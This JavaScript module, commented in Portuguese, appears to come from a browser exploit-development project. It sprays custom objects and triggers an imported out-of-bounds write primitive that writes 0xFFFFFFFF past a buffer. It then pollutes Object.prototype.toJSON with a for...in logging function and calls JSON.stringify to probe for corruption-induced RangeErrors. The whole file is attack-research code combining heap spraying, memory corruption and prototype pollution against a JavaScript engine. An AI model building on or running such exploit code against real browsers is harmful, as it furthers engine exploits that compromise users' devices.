// js/script3/testForInPropertyAccessRE.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `MyComplexObjRE-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1_re";
        this.prop2 = { nested: "complex_prop2_nested_re" };
        this.propA = "valA_re";
        this.propB = 2345689;
        this.propC = null;
        this.propD = { nested_prop_re: "valD_original_re" };
        this.propE = [101, 202, 303];
    }
}

// toJSON que tenta acessar this[prop] dentro do loop for...in, com logging DETALHADO
export function toJSON_ForInWithDetailedPropertyAccessLogging() {
    const FNAME_toJSON = "toJSON_ForInDetailedAccessLog";
    let iteration_count = 0;
    const MAX_ITER_LOG_PROPS = 30; // Logar mais propriedades
    const MAX_ITER_SAFETY_BREAK = 200; // Reduzido para ver se o safety break é atingido antes do RangeError

    let result_payload = {
        variant: FNAME_toJSON,
        id_at_entry: "N/A",
        iterations_attempted: 0,
        props_successfully_accessed: {},
        last_prop_before_error: "N/A",
        error_details: null
    };

    try {
        result_payload.id_at_entry = String(this?.id).substring(0,20);
        logS3(`[${FNAME_toJSON}] Entrando. this.id (tentativa): ${result_payload.id_at_entry}`, "info", FNAME_toJSON);
    } catch(e_id) {
        logS3(`[${FNAME_toJSON}] Erro ao ler this.id na entrada: ${e_id.name}`, "warn", FNAME_toJSON);
        result_payload.id_at_entry = `Error: ${e_id.name}`;
    }

    try {
        if (typeof this !== 'object' || this === null) {
            logS3(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo no início do loop.`, "warn", FNAME_toJSON);
            result_payload.error_details = "this is not object or null at loop start";
            return result_payload;
        }

        for (const prop in this) {
            iteration_count++;
            result_payload.iterations_attempted = iteration_count;
            result_payload.last_prop_before_error = prop; // Atualiza a cada iteração

            if (iteration_count <= MAX_ITER_LOG_PROPS) {
                logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Tentando acessar Prop: '${prop}'...`, "info", FNAME_toJSON);
            }

            try {
                const val = this[prop]; // <<<< PONTO CRÍTICO DO ACESSO

                if (iteration_count <= MAX_ITER_LOG_PROPS) {
                    let val_str = "N/A";
                    const val_type = typeof val;
                    if (val_type !== 'function' && val_type !== 'object') {
                        val_str = String(val).substring(0, 30);
                    } else if (Array.isArray(val)) {
                        val_str = `[Array(${val.length})]`;
                    } else if (val_type === 'object' && val !== null) {
                        val_str = `[object ${val.constructor?.name || ''}]`;
                    } else if (val_type === 'function') {
                        val_str = `[Function ${val.name || ''}]`;
                    }
                    logS3(`[${FNAME_toJSON}]   Prop '${prop}' ACESSADA. Type: ${val_type}, Val_str: ${val_str}`, "good", FNAME_toJSON);
                    result_payload.props_successfully_accessed[prop] = { type: val_type, value_str: val_str };
                }
            } catch (e_access) {
                logS3(`[${FNAME_toJSON}]   ERRO AO ACESSAR this['${prop}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                result_payload.errors_during_iteration = (result_payload.errors_during_iteration || []);
                result_payload.errors_during_iteration.push(`Error accessing prop '${prop}': ${e_access.name} - ${e_access.message}`);
                // Não vamos parar no primeiro erro de acesso, pode haver mais informações ou o RangeError pode ser diferente.
            }

            if (iteration_count > MAX_ITER_SAFETY_BREAK) {
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${prop}'.`, "warn", FNAME_toJSON);
                result_payload.error_details = `Safety break after ${MAX_ITER_SAFETY_BREAK} iterations. Last prop: ${prop}.`;
                result_payload.max_iterations_reached = true;
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`, "info", FNAME_toJSON);
    } catch (e_loop) {
        // Este catch pegaria um erro no próprio mecanismo 'for...in', o que é raro.
        // O RangeError geralmente acontece no acesso this[prop] ou na lógica de stringify.
        logS3(`[${FNAME_toJSON}] EXCEPTION NO MECANISMO for...in: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
        result_payload.error_details = `EXCEPTION in for...in mechanism: ${e_loop.name}: ${e_loop.message}`;
    }
    return result_payload;
}

export async function executeForInPropertyAccessRETest() {
    const FNAME_TEST = "executeForInPropertyAccessRETest_DetailedLog"; // Nome da função de teste atualizado
    logS3(`--- Iniciando Teste: Acesso a Propriedade em 'for...in' (RangeError Check - Log Detalhado) ---`, "test", FNAME_TEST);
    document.title = `ForIn PropAccess RE Detailed`;

    const spray_count = 5;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro MyComplexObjectForRangeError via JSON.stringify (com ${toJSON_ForInWithDetailedPropertyAccessLogging.name})...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ForInWithDetailedPropertyAccessLogging,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSON_ForInWithDetailedPropertyAccessLogging.name}.`, "info", FNAME_TEST);

        logS3(`   Testando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
        document.title = `Sondando MyComplexObj 0 (ForIn Detailed RE)`;
        try {
            logS3(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`, "info", FNAME_TEST);
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`, "info", FNAME_TEST);
            logS3(`     JSON.stringify(obj[0]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);
            if(stringifyResult && stringifyResult.error_details) {
                 logS3(`     Detalhe de erro da toJSON: ${stringifyResult.error_details}`, "warn", FNAME_TEST);
            }

        } catch (e_str) {
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED! (DetailedForIn)`;
            }
            problem_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected) {
        logS3("RangeError NÃO ocorreu com a toJSON de log detalhado.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Acesso a Propriedade em 'for...in' (RangeError Check - Log Detalhado) CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_detected) {
        document.title = `ForIn DetailedLog OK`;
    }
}
